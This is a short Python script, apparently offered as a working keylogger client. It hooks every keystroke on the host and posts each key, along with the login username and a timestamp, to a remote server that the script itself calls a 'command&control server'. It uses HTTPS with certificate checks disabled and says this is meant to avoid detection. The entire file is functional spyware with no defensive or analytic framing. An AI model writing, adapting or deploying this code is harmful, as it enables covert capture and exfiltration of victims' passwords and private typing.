#!/usr/bin/env python3
from requests import Session
from datetime import datetime
from urllib3 import disable_warnings
import keyboard
import os

disable_warnings()
DEFAULT_SERVER_PORT = 443


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Captures keystrokes and sends them over the internet "
                                        "to the command&control server. "
                                        "The client and the server use HTTPS for avoiding detection.")
    parser.add_argument('--server-address',
                        dest='server_address',
                        required=True,
                        type=str,
                        help='Specify an IP address or a domain name of the server '
                             'that receives the data stream from the keylogger')
    parser.add_argument('--server-port',
                        dest='server_port',
                        required=False,
                        default=DEFAULT_SERVER_PORT,
                        type=int,
                        help='Specify the server port. '
                             f'{DEFAULT_SERVER_PORT}/tcp is set by default.')
    options = parser.parse_args()
    return options


def normalize_event(event):
    special_buttons = ['ctrl', 'shift', 'alt', 'enter', 'esc', 'tab', 'space']
    if event.name in special_buttons:
        return f'{os.linesep}[{event.name}]{os.linesep}'
    else:
        return event.name


def communicate(event):
    try:
        now = datetime.now()
        with Session() as session:
            global session_id
            if session_id:
                session.headers['Session-ID'] = session_id

            resp = session.post(f"{server_base_url}/log",
                                json={
                                    'creation_timestamp': now.strftime("%m/%d/%Y, %H:%M:%S"),
                                    'username': os.getlogin(),
                                    'key_pressed': normalize_event(event)
                                },
                                verify=False)

            session_id = resp.headers['Session-ID']
    except Exception as e:
        print(f"[-] {type(e)} - {e}")


options = get_arguments()
server_base_url = f"https://{options.server_address}:{options.server_port}"

session_id = ''
keyboard.hook(lambda event: communicate(event) if event.event_type == 'down' else None)

while True:
    pass
